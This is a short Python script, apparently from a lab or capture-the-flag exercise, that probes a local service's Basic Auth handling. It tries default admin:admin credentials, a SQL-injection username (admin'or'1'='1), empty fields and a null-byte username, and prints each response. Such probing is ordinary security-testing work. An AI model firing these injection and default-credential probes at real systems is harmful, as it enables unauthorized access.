#!/usr/bin/env python3
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = "http://127.0.0.1:33189"

print("Testing Basic Auth header manipulation on", target_url)
print("=" * 80)

# Test 1: No authentication (baseline)
print("\n[TEST 1] No credentials")
try:
    r = requests.get(target_url, timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Content: {r.text[:200]}...")
    print()
except Exception as e:
    print(f"Error: {e}\n")

# Test 2: Valid credentials (should be 500 according to context)
print("[TEST 2] Valid credentials (admin:admin)")
try:
    r = requests.get(target_url, auth=('admin', 'admin'), timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Content: {r.text[:200]}...")
    print()
except Exception as e:
    print(f"Error: {e}\n")

# Test 3: Try special chars in username
print("[TEST 3] Special chars in username (admin'or'1'='1)")
try:
    r = requests.get(target_url, auth=("admin'or'1'='1", "pass"), timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Content: {r.text[:200]}...")
    print()
except Exception as e:
    print(f"Error: {e}\n")

# Test 4: Try empty username
print("[TEST 4] Empty username (:password)")
try:
    r = requests.get(target_url, auth=("", "password"), timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Content: {r.text[:200]}...")
    print()
except Exception as e:
    print(f"Error: {e}\n")

# Test 5: Try empty password
print("[TEST 5] Empty password (username:)")
try:
    r = requests.get(target_url, auth=("username", ""), timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Content: {r.text[:200]}...")
    print()
except Exception as e:
    print(f"Error: {e}\n")

# Test 6: Try null byte
print("[TEST 6] Null byte in username")
try:
    r = requests.get(target_url, auth=("admin%00", "pass"), timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Content: {r.text[:200]}...")
    print()
except Exception as e:
    print(f"Error: {e}\n")

print("=" * 80)
print("Testing complete.")
